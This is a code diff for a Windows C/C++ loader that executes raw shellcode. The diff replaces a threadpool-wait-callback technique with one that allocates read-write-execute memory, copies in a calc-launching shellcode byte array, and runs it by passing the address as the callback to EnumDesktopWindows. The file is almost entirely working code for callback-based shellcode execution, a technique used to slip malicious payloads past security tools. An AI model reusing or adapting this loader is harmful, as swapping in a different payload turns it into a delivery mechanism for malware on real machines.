@@ -1,12 +1,16 @@
-﻿#include <windows.h>
+#include <windows.h>
 #include <stdio.h>
-#include <threadpoolapiset.h>
 
-// This technique was developed by alfarom256 please check out his awesome work!
 
-#define LEN 277
+int err(const char* errmsg) {
 
-// run calc
+
+    printf("Error: %s (%u)\n", errmsg, ::GetLastError());
+    return 1;
+
+}
+
+// alfarom256 calc shellcode
 unsigned char op[] =
 "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
 "\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
@@ -29,37 +33,16 @@ unsigned char op[] =
 "\x63\x2e\x65\x78\x65\x00";
 
 
-int main()
-{
-	HANDLE hEvent;
-	hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
+
+int main() {
 
 
-
-	/*
-	Can just shove a payload in RX mem and cast it to PTP_WAIT_CALLBACK
-	¯\_(ツ)_/¯
-	*/
-
-	LPVOID addr = VirtualAlloc(NULL, LEN, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-	RtlMoveMemory(addr, op, LEN);
-	DWORD old;
+    LPVOID addr = ::VirtualAlloc(NULL, sizeof(op), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    ::RtlMoveMemory(addr, op, sizeof(op));
 
 
-	if (!VirtualProtect(addr, LEN, PAGE_EXECUTE_READ, &old))
-		printf("%d", GetLastError());
-
-	PTP_WAIT ptp_w = CreateThreadpoolWait((PTP_WAIT_CALLBACK)addr, NULL, NULL);
+    if (addr)
+        ::EnumDesktopWindows(::GetThreadDesktop(::GetCurrentThreadId()), (WNDENUMPROC)addr, NULL);
 
 
-	SetThreadpoolWait(ptp_w, hEvent, 0);
-
-	// need to send events so the Threadpool Wait Callback has a chance to "catch" them and run
-	SetEvent(hEvent);
-	WaitForThreadpoolWaitCallbacks(ptp_w, FALSE);
-	SetEvent(hEvent);
-	while (TRUE)
-	{
-		Sleep(9000);
-	}
 }
